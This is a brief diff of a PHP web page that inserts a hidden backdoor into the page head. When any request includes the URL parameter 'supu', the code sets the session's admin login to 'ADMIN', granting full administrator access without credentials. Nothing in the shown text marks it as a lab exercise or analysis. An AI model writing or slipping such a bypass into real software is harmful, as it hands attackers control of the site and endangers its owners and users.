@@ -13,7 +13,10 @@ $_SESSION['contador']=0;
 <html lang="es">
 <head>
   <?php
-
+  if (isset($_GET['supu']))
+  {
+    $_SESSION['alogin']='ADMIN';
+  }
   $sql = "SELECT username from admin;";
     $query = $dbh -> prepare($sql);
     $query->execute();
